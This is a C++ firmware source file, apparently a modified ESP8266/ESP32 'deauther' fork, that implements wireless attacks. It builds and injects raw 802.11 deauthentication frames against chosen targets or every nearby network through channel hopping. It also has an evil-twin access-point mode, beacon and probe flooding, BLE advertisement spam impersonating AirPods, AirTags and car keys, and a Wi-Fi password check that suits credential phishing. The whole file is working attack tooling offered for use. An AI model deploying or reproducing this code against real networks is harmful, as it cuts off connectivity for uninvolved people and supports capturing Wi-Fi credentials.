/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "Attack.h"

#ifdef ESP32
    #include <esp_wifi.h>
    
    // External declaration of esp_wifi_80211_tx for raw packet injection
    extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
#endif

#include "settings.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        // 100ms beacon interval
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;
    Attack::trueDeauth    = deauthAll;

    Attack::output  = output;
    Attack::timeout = timeout;

    if (beacon || probe || deauthAll || deauth) {
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::startEvilTwin(const char* ssid, uint8_t ch, bool wpa2, const uint8_t* mac) {
    stop();
    evilTwin = true;
    evilTwinSSID = ssid;
    evilTwinChannel = ch;
    evilTwinWPA2 = wpa2;
    prntln(A_EVIL_TWIN_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    running = true;
}

void Attack::startTrueDeauth() {
    stop();
    trueDeauth = true;
    running = true;
    attackTime = currentTime;
    attackStartTime = currentTime;
    
    clearWhitelist();
    
    #ifdef ESP32
    uint8_t apMac[6];
    wifi_interface_t ifx = WIFI_IF_AP;
    esp_wifi_get_mac(ifx, apMac);
    addToWhitelist(apMac);
    
    String apMacStr = macToStr(apMac);
    prntln("=================================");
    prntln("TRUE DEAUTH - KILL ALL WIFI");
    prnt("Protected AP MAC: ");
    prntln(apMacStr.c_str());
    prntln("Channel Hopping: 1-13");
    prntln("=================================");
    #else
    prntln("=================================");
    prntln("TRUE DEAUTH - KILL ALL WIFI");
    prntln("Channel Hopping: 1-13");
    prntln("Broadcasting deauth to ALL");
    prntln("=================================");
    #endif
    
    setWifiChannel(1, true);
}

void Attack::stop() {
    if (running) {
#ifdef ESP32
        if (bleSpam) {
            BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
            pAdvertising->stop();
        }
#endif
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        evilTwin             = false;
        trueDeauth           = false;
        beaconSpam           = false;
        beaconSpamPkts       = 0;
        bleSpam              = false;
        bleSpamPkts          = 0;
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

bool Attack::isEvilTwinRunning() {
    return evilTwin;
}

String Attack::getEvilTwinTargetSSID() {
    if (evilTwin && evilTwinSSID.length() > 0) {
        return evilTwinSSID;
    }
    return "";
}

void Attack::updateCounter() {
    // stop when timeout is active and time is up
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    // deauth packets per second
    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                                        (accesspoints.count() + stations.count() * 2 - names.selected());
        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
    } else {
        deauth.maxPkts = 0;
    }

    // beacon packets per second
    if (beacon.active) {
        beacon.maxPkts = ssids.count();

        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    // random transmission power
    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
    else setOutputPower(20.5f);

    // reset counters
    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];

    sprintf(s, str(
                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    String json = String(OPEN_BRACKET);                                                                          // [

    json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) +
            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);              // [false,0,0,0],
    json += String(packetRate);                                                                                  // 0
    json += CLOSE_BRACKET;                                                                                       // ]

    return json;
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();

    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();
    
    if (evilTwin) evilTwinUpdate();
    if (trueDeauth) trueDeauthUpdate();
    if (beaconSpam) beaconSpamUpdate();
    if (bleSpam) bleSpamUpdate();

    if (currentTime - attackTime > 1000) {
        attackTime = currentTime;
        updateCounter();

        if (output) status();
        getRandomMac(mac);
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                if (accesspoints.getSelected(deauth.tc)) {
                    deauth.tc += deauthAP(deauth.tc);
                    // Send multiple packets per AP for ESP32
                    #ifdef ESP32
                    for (int i = 0; i < 3; i++) deauthAP(deauth.tc - 1);
                    #endif
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                if (stations.getSelected(deauth.tc - apCount)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                    // Send multiple packets per station for ESP32
                    #ifdef ESP32
                    for (int i = 0; i < 3; i++) deauthStation(deauth.tc - apCount - 1);
                    #endif
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                if (names.getSelected(deauth.tc - stCount - apCount)) {
                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
                    #ifdef ESP32
                    for (int i = 0; i < 3; i++) deauthName(deauth.tc - stCount - apCount - 1);
                    #endif
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = names.findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                tmpID = names.findID(stations.getMac(deauth.tc - apCount));

                if (tmpID < 0) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
                if (!names.getSelected(deauth.tc - apCount - stCount)) {
                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // exit when station mac is null

    // Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging

    bool success = false;

    // build deauth packet
    packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    if (sendPacket(deauthpkt, packetSize, ch, true)) {
        success = true;
        deauth.packetCounter++;
    }

    // send disassociate frame
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    if (sendPacket(disassocpkt, packetSize, ch, false)) {
        success = true;
        deauth.packetCounter++;
    }

    // send another packet, this time from the station to the accesspoint
    if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
        // build deauth packet
        memcpy(&disassocpkt[4], apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        // send deauth frame
        disassocpkt[0] = 0xc0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }

        // send disassociate frame
        disassocpkt[0] = 0xa0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }
    }

    if (success) deauth.time = currentTime;

    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);

    beaconPacket[82] = ch;

    // =====
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // calc size
    uint8_t* tmpPacket     = new uint8_t[tmpPacketSize];                 // create packet buffer

    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // copy first half of packet into buffer
    tmpPacket[37] = ssidLen;                                             // update SSID length byte
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    delete[] tmpPacket; // free memory of allocated buffer

    return success;
    // =====
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    setWifiChannel(ch, force_ch);

    bool sent = false;
#ifdef ESP32
    // ESP32 raw packet injection via esp_wifi_80211_tx
    // The ieee80211_raw_frame_sanity_check bypass must return 1 for this to work
    wifi_interface_t interfaces[] = {WIFI_IF_AP, WIFI_IF_STA};
    
    for (int i = 0; i < 2 && !sent; i++) {
        for (int retry = 0; retry < 10 && !sent; retry++) {
            // en_sys_seq=false allows raw frame injection without hardware sequence
            esp_err_t err = esp_wifi_80211_tx(interfaces[i], packet, packetSize, false);
            if (err == ESP_OK) {
                sent = true;
                break;
            }
            delayMicroseconds(30);
        }
    }
#else
    sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
#endif

    if (sent) ++tmpPacketRate;

    return sent;
}

bool Attack::sendDeauthFrame(uint8_t* targetMac, uint8_t* apMac, uint8_t reason) {
    // ESP32 deauth frame structure (tested and working with ieee80211_raw_frame_sanity_check bypass)
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         // Frame Control: Deauth
        0x3A, 0x01,                         // Duration + flags
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast/station)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC - to be filled)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC - to be filled)
        0xF0, 0xFF,                         // Sequence Control
        0x02, 0x00                          // Reason: Unspecified (to be filled)
    };
    
    // Copy MAC addresses
    if (targetMac) memcpy(&deauthPacket[4], targetMac, 6);
    if (apMac) memcpy(&deauthPacket[10], apMac, 6);
    memcpy(&deauthPacket[16], apMac ? apMac : targetMac, 6);
    deauthPacket[24] = reason;
    
    return sendPacket(deauthPacket, 26, wifi_channel, true);
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}

void Attack::evilTwinUpdate() {
    if (!evilTwin || accesspoints.count() == 0) return;
    
    setWifiChannel(evilTwinChannel, true);
    
    if (beacon.time <= currentTime - 100) {
        uint8_t fakeMac[6];
        getRandomMac(fakeMac);
        sendBeacon(fakeMac, evilTwinSSID.c_str(), evilTwinChannel, evilTwinWPA2);
        beacon.time = currentTime;
    }
    
    if (deauth.active) {
        for (int i = 0; i < apCount; i++) {
            if (accesspoints.getSelected(i)) {
                deauthAP(i);
            }
        }
    }
}

void Attack::trueDeauthUpdate() {
    if (!trueDeauth) return;
    
    static uint32_t lastChannelHop = 0;
    static uint8_t currentHopChannel = 1;
    
    if (currentTime - lastChannelHop > 200) {
        lastChannelHop = currentTime;
        currentHopChannel++;
        if (currentHopChannel > 13) currentHopChannel = 1;
        setWifiChannel(currentHopChannel, true);
    }
    
    static uint32_t lastDeauth = 0;
    if (currentTime - lastDeauth > 10) {
        lastDeauth = currentTime;
        
        #ifdef ESP32
        uint8_t apMac[6];
        wifi_interface_t ifx = WIFI_IF_AP;
        esp_wifi_get_mac(ifx, apMac);
        
        uint8_t deauthBroadcast[26] = {
            0xC0, 0x00,
            0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x01, 0x00
        };
        #else
        uint8_t deauthBroadcast[26] = {
            0xC0, 0x00,
            0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x01, 0x00
        };
        #endif
        
        sendPacket(deauthBroadcast, 26, currentHopChannel, true);
        deauthPkts++;
        
        for (int i = 0; i < apCount; i++) {
            if (accesspoints.getSelected(i)) {
                deauthAP(i);
            }
        }
    }
}

void Attack::startBeaconSpam(int apCount, uint8_t ch) {
    stop();
    running = true;
    beaconSpam = true;
    beaconSpamCount = apCount;
    wifi_channel = ch;
    beaconSpamPkts = 0;
    attackStartTime = currentTime;
    
    if (output) {
        prntln("Starting Beacon Spam...");
        prnt("Sending ");
        prnt(apCount);
        prntln(" fake APs");
    }
}

void Attack::beaconSpamUpdate() {
    if (!beaconSpam) return;
    
    if (beaconSpamPkts == 0 || currentTime - beacon.time >= 1) {
        uint8_t fakeMac[6];
        char ssid[33];
        
        for (int i = 0; i < beaconSpamCount; i++) {
            getRandomMac(fakeMac);
            
            int ssidLen = random(8, 33);
            for (int j = 0; j < ssidLen; j++) {
                ssid[j] = random(32, 127);
            }
            ssid[ssidLen] = '\0';
            
            sendBeacon(fakeMac, ssid, wifi_channel, random(0, 2) == 1);
        }
        
        beacon.time = currentTime;
        beaconSpamPkts += beaconSpamCount;
    }
}

bool Attack::isBeaconSpamRunning() {
    return beaconSpam;
}

uint32_t Attack::getBeaconSpamPkts() {
    return beaconSpamPkts;
}

void Attack::startBleSpam(int advCount) {
    startBleSpamMode(0, advCount);
}

void Attack::startBleSpamMode(int mode, int advCount) {
#ifdef ESP32
    stop();
    running = true;
    bleSpam = true;
    bleSpamMode = mode;
    bleSpamCount = advCount;
    bleSpamPkts = 0;
    attackStartTime = currentTime;
    
    BLEDevice::init("GMpro87");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    
    if (output) {
        prntln("Starting BLE Spam...");
        prnt("Mode: ");
        switch(mode) {
            case 0: prntln("Basic Device Spam"); break;
            case 1: prntln("iBeacon Spam"); break;
            case 2: prntln("Eddystone-UID Spam"); break;
            case 3: prntln("Eddystone-URL Spam"); break;
            case 4: prntln("Fast Beacon Flood"); break;
            default: prntln("Unknown"); break;
        }
        prnt("Count: ");
        prntln(advCount);
    }
#else
    if (output) {
        prntln("BLE Spam requires ESP32!");
    }
#endif
}

void Attack::setBleSpamiBeacon(const char* uuid, uint16_t major, uint16_t minor, int8_t txPower) {
    bleSpamUUID = String(uuid);
    bleSpamMajor = major;
    bleSpamMinor = minor;
    bleSpamTXPower = txPower;
}

void Attack::setBleSpamEddystone(const char* url, int type) {
    bleSpamEddyURL = String(url);
    bleSpamEddyType = type;
}

void Attack::setBleSpamInterval(uint16_t interval) {
    bleSpamInterval = interval;
}

void Attack::bleSpamUpdate() {
#ifdef ESP32
    if (!bleSpam) return;
    
    if (bleSpamPkts == 0 || currentTime - beacon.time >= bleSpamInterval) {
        switch(bleSpamMode) {
            case 0: bleSpamBasic(); break;
            case 1: bleSpamiBeacon(); break;
            case 2: bleSpamEddystone(); break;
            case 3: bleSpamEddystone(); break;
            case 4: bleSpamFast(); break;
            default: bleSpamBasic(); break;
        }
        beacon.time = currentTime;
        bleSpamPkts++;
    }
#endif
}

void Attack::bleSpamBasic() {
#ifdef ESP32
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    
    const char* bleNames[] = {
        "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen3",
        "Galaxy Buds", "Galaxy Buds+", "Galaxy Buds Pro", "Galaxy Buds2",
        "Galaxy Buds Live", "Galaxy Buds Pro2",
        "Pixel Buds", "Pixel Buds Pro",
        "Bose QC Earbuds", "Bose QC45", "Bose Sport Earbuds",
        "Sony WF-1000XM4", "Sony WF-1000XM5", "Sony WH-1000XM4", "Sony WH-1000XM5",
        "Jabra Elite 75t", "Jabra Elite 85t", "Jabra Elite 7 Pro",
        "Samsung Buds", "Samsung Buds Live", "Samsung Buds Pro",
        "Anker Soundcore", "Anker Liberty", "SoundPEATS",
        "Xiaomi Earbuds", "Xiaomi FlipBuds",
        "OnePlus Buds", "OnePlus Buds Pro", "Oppo Enco",
        "Vivo TWS", "Realme Buds Air",
        "Smart Tag", "SmartTag+", "Galaxy Tag", "Apple AirTag",
        "Tile Pro", "Tile Mate", "Tile Slim",
        "Apple Watch", "Apple Watch Series", "Apple Watch Ultra",
        "Galaxy Watch", "Galaxy Watch4", "Galaxy Watch5", "Galaxy Watch6",
        "Fitbit", "Fitbit Charge", "Fitbit Versa",
        "Garmin", "Garmin Venu", "Garmin Forerunner",
        "Oura Ring", "Whoop", "Withings",
        "iPhone", "iPhone Pro", "iPhone Max",
        "Samsung Phone", "Pixel Phone", "OnePlus", "Xiaomi Phone",
        "MacBook Pro", "MacBook Air", "iPad Pro",
        "Surface Pro", "ThinkPad", "Dell XPS",
        "Tesla Model", "Tesla Key", "Car Key",
        "Nintendo Switch", "Steam Deck", "PS5 Controller",
        "Galaxy Tab", "iPad", "Surface"
    };
    
    int nameCount = 66;
    int nameIdx = random(0, nameCount);
    
    advData.setName(bleNames[nameIdx]);
    
    std::string mfgData;
    mfgData += (char)0x4C;
    mfgData += (char)0x00;
    mfgData += (char)0x02;
    mfgData += (char)0x15;
    for (int i = 0; i < 6; i++) {
        mfgData += (char)random(256);
    }
    mfgData += (char)random(256);
    mfgData += (char)random(256);
    
    advData.setManufacturerData(mfgData);
    
    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x40);
    pAdvertising->start();
#endif
}

void Attack::bleSpamiBeacon() {
#ifdef ESP32
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    
    std::string mfgData;
    mfgData += (char)0x4C;
    mfgData += (char)0x00;
    mfgData += (char)0x02;
    mfgData += (char)0x15;
    
    String uuid = bleSpamUUID;
    uuid.replace("-", "");
    for (int i = 0; i < uuid.length(); i += 2) {
        String byteStr = uuid.substring(i, i + 2);
        mfgData += (char)strtol(byteStr.c_str(), NULL, 16);
    }
    
    mfgData += (char)((bleSpamMajor >> 8) & 0xFF);
    mfgData += (char)(bleSpamMajor & 0xFF);
    mfgData += (char)((bleSpamMinor >> 8) & 0xFF);
    mfgData += (char)(bleSpamMinor & 0xFF);
    
    mfgData += (char)(uint8_t)bleSpamTXPower;
    
    advData.setManufacturerData(mfgData);
    advData.setName("iBeacon");
    
    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x40);
    pAdvertising->start();
    
    bleSpamMinor++;
    if (bleSpamMinor >= 65535) {
        bleSpamMinor = 0;
        bleSpamMajor++;
        if (bleSpamMajor >= 65535) bleSpamMajor = 0;
    }
#endif
}

void Attack::bleSpamEddystone() {
#ifdef ESP32
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    
    if (bleSpamEddyType == 3) {
        std::string serviceData;
        serviceData += (char)0xAA;
        serviceData += (char)0xFE;
        serviceData += (char)0x10;
        
        uint8_t txPower = (uint8_t)(int8_t)bleSpamTXPower;
        serviceData += (char)txPower;
        
        String url = bleSpamEddyURL;
        url.replace("https://", "");
        url.replace("http://", "");
        
        uint8_t encoded[30];
        int encLen = 0;
        
        const char* prefix = url.c_str();
        if (url.startsWith("https://")) {
            encoded[encLen++] = 0x00;
        } else {
            encoded[encLen++] = 0x01;
        }
        
        url = url.substring(url.indexOf("//") + 2);
        
        for (int i = 0; i < url.length() && encLen < 29; i++) {
            char c = url.charAt(i);
            if (c == '.') {
                if (url.substring(i).endsWith(".com/")) {
                    encoded[encLen++] = 0x07;
                } else if (url.substring(i).startsWith(".com")) {
                    encoded[encLen++] = 0x08;
                } else if (url.substring(i).startsWith(".org")) {
                    encoded[encLen++] = 0x09;
                } else if (url.substring(i).startsWith(".edu")) {
                    encoded[encLen++] = 0x0A;
                } else if (url.substring(i).startsWith(".net")) {
                    encoded[encLen++] = 0x0B;
                } else if (url.substring(i).startsWith(".info")) {
                    encoded[encLen++] = 0x0C;
                } else {
                    encoded[encLen++] = 0x02;
                }
            } else if (c == '/') {
                encoded[encLen++] = 0xFF;
                break;
            } else {
                encoded[encLen++] = c;
            }
        }
        
        for (int i = 0; i < encLen; i++) {
            serviceData += (char)encoded[i];
        }
        
        advData.setServiceData(serviceData);
        advData.setName("Eddystone-URL");
    } else {
        std::string serviceData;
        serviceData += (char)0xAA;
        serviceData += (char)0xFE;
        serviceData += (char)0x00;
        
        uint8_t txPower = (uint8_t)(int8_t)bleSpamTXPower;
        serviceData += (char)txPower;
        serviceData += (char)0x00;
        
        for (int i = 0; i < 10; i++) {
            serviceData += (char)random(256);
        }
        
        advData.setServiceData(serviceData);
        advData.setName("Eddystone-UID");
    }
    
    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x40);
    pAdvertising->start();
#endif
}

void Attack::bleSpamFast() {
#ifdef ESP32
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    
    const char* bleNames[] = {
        "AirPods", "Galaxy Buds", "Pixel Buds", "AirTag", "Galaxy Tag",
        "Apple Watch", "Galaxy Watch", "iPhone", "Tesla Key", "Car Key",
        "Tile", "Smart Tag", "PS5", "Nintendo", "Steam Deck"
    };
    
    int nameIdx = random(0, 15);
    advData.setName(bleNames[nameIdx]);
    
    std::string mfgData;
    for (int i = 0; i < 20; i++) {
        mfgData += (char)random(256);
    }
    advData.setManufacturerData(mfgData);
    
    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x04);
    pAdvertising->setMaxInterval(0x08);
    pAdvertising->start();
#endif
}

bool Attack::isBleSpamRunning() {
    return bleSpam;
}

uint32_t Attack::getBleSpamPkts() {
    return bleSpamPkts;
}

bool Attack::validatePassword(const char* ssid, const char* password) {
    #ifdef ESP32
    if (validatingPassword) return false;
    
    validatingPassword = true;
    passwordValid = false;
    validationResult = "Testing: " + String(ssid);
    
    WiFi.disconnect(true, true);
    delay(100);
    
    WiFi.begin(ssid, password);
    
    uint32_t startTime = millis();
    uint32_t timeout = 10000;
    
    while (WiFi.status() != WL_CONNECTED && millis() - startTime < timeout) {
        delay(100);
        if (WiFi.status() == WL_CONNECT_FAILED) {
            validatingPassword = false;
            validationResult = "FAILED";
            passwordValid = false;
            WiFi.disconnect(true, true);
            return false;
        }
    }
    
    validatingPassword = false;
    
    if (WiFi.status() == WL_CONNECTED) {
        passwordValid = true;
        validationResult = "SUCCESS! Connected to " + String(ssid);
        WiFi.disconnect(true, true);
        return true;
    } else {
        passwordValid = false;
        validationResult = "FAILED";
        WiFi.disconnect(true, true);
        return false;
    }
    #else
    return false;
    #endif
}

bool Attack::isValidating() {
    return validatingPassword;
}

String Attack::getValidationResult() {
    return validationResult;
}

void Attack::addToWhitelist(uint8_t* mac) {
    if (whitelistCount < 10) {
        for (int i = 0; i < 6; i++) {
            whitelist[whitelistCount][i] = mac[i];
        }
        whitelistCount++;
    }
}

bool Attack::isWhitelisted(uint8_t* mac) {
    for (int i = 0; i < whitelistCount; i++) {
        bool match = true;
        for (int j = 0; j < 6; j++) {
            if (whitelist[i][j] != mac[j]) {
                match = false;
                break;
            }
        }
        if (match) return true;
    }
    return false;
}

void Attack::clearWhitelist() {
    whitelistCount = 0;
}